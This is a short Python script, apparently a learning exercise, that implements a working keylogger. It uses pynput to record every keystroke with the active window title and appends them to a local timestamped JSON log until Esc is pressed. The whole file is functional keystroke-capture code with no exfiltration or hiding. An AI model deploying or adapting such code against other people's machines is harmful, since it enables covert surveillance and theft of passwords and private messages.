# What Does a Keylogger Do?
#Listen for keyboard input 
#Capture that key 
#Save it somewhere 
#Stop when asked 

from pynput import keyboard
import json
from datetime import datetime
import win32gui
from pathlib import Path

Path("logs").mkdir(exist_ok=True)

log_file = Path("logs") / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"


def get_active_window():
    """Get the currecntly active window title"""
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title if title else "Unknown"
    except:
        return "Unknown"


def on_press(key):
    try:
        # To get the character
        char = key.char
    except AttributeError:
        char = str(key)
    window = get_active_window()

    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "key": char,
        "window": window
    }

    with open(log_file, "a") as f:
        json.dump (log_entry, f)
        f.write ("\n")


def on_release(key):
    if key == keyboard.Key.esc:
        print ("Stopped.")
        return False #stops the listener

if __name__ == "__main__":
    listener = keyboard.Listener (on_press = on_press, on_release=on_release)
    listener.start()
    listener.join()
    
